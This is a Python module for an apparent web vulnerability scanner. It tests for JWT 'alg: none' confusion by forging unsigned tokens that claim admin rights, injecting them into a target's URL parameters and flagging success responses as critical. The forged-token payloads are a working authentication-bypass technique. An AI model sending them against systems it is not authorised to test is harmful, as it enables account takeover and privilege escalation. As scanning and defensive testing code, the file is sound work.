import json
import base64
import httpx
from modules.scanner.base_check import BaseCheck, CheckResult
from urllib.parse import urlparse, parse_qsl, urlencode


class ActiveJwtAlgConfusionCheck(BaseCheck):
    name = "active_jwt_alg_confusion"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            for param in target_params:
                modified = dict(base_request)
                parsed = urlparse(modified["url"])
                params = dict(parse_qsl(parsed.query))
                for alg in ["none", "None", "NONE", "nOnE"]:
                    header = base64.urlsafe_b64encode(json.dumps({"alg": alg, "typ": "JWT"}).encode()).rstrip(b"=").decode()
                    payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "admin": True}).encode()).rstrip(b"=").decode()
                    jwt = f"{header}.{payload}."
                    params[param] = jwt
                    modified["url"] = parsed._replace(query=urlencode(params)).geturl()
                    try:
                        resp = await client.request(**modified)
                        if resp.status_code in (200, 302, 303):
                            results.append(CheckResult(
                                triggered=True,
                                severity="critical",
                                title=f"JWT Algorithm Confusion ({alg})",
                                description=f"Server accepted JWT with 'alg: {alg}'.",
                                evidence=f"Payload: {jwt}\nStatus: {resp.status_code}",
                                remediation="Enforce algorithm whitelist. Reject 'none' algorithm. Verify signature with correct key.",
                                cwe="CWE-347",
                            ))
                    except Exception:
                        continue
        return results
